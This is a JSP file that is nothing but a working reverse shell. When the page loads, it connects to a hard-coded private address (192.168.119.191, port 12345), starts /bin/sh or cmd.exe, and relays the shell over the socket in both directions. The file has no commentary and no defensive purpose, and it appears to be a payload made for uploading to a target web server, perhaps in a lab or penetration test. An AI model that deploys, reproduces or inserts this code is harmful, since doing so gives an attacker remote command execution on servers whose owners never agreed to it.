<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream cJ;
    OutputStream nT;

    StreamConnector( InputStream cJ, OutputStream nT )
    {
      this.cJ = cJ;
      this.nT = nT;
    }

    public void run()
    {
      BufferedReader dV  = null;
      BufferedWriter t8a = null;
      try
      {
        dV  = new BufferedReader( new InputStreamReader( this.cJ ) );
        t8a = new BufferedWriter( new OutputStreamWriter( this.nT ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = dV.read( buffer, 0, buffer.length ) ) > 0 )
        {
          t8a.write( buffer, 0, length );
          t8a.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( dV != null )
          dV.close();
        if( t8a != null )
          t8a.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.191", 12345 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
